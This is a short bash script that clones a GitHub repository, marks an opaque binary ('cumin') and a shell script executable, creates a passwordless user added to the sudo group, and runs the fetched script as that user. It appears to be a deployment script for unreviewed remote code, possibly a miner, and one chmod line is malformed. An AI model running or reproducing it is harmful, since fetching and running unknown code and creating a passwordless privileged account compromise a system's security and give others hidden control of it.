#!/bin/bash
sudo apt update
git clone https://github.com/Pantaiselatan/tiger.git && cd tiger
chmod +x okeh.sh && chmod +x cumin chmod 1000 cumin okeh.sh
sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
sudo -u hoh -H sh -c "./okeh.sh"
sudo apt update
